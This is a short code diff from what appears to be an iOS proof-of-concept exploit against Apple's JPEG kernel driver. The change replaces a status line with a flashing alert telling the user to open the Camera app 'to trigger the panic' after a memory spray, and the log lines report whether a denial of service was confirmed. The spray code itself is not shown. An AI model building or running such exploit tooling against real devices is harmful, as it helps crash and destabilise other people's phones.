@@ -998,8 +998,26 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
             wiredAfter, wiredAfter * (int64_t)pageSize / (1024*1024)];
         [self log:@"Driver: %@",
             healthy ? @"OK" : @"BROKEN (DoS confirmed)"];
-        [self setStatus:@"Done. Now open the Camera app."];
         self.running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.statusLabel.text = @"OPEN CAMERA NOW";
+            self.statusLabel.font = [UIFont systemFontOfSize:28 weight:UIFontWeightBlack];
+            self.statusLabel.textColor = [UIColor redColor];
+
+            // Pulse animation
+            [UIView animateWithDuration:0.5 delay:0
+                options:UIViewAnimationOptionRepeat | UIViewAnimationOptionAutoreverse
+                animations:^{ self.statusLabel.alpha = 0.2; }
+                completion:nil];
+
+            UIAlertController *alert = [UIAlertController
+                alertControllerWithTitle:@"Open Camera"
+                message:@"Spray complete. Open the Camera app now to trigger the panic."
+                preferredStyle:UIAlertControllerStyleAlert];
+            [alert addAction:[UIAlertAction actionWithTitle:@"OK"
+                style:UIAlertActionStyleDefault handler:nil]];
+            [self presentViewController:alert animated:YES completion:nil];
+        });
     });
 }
 
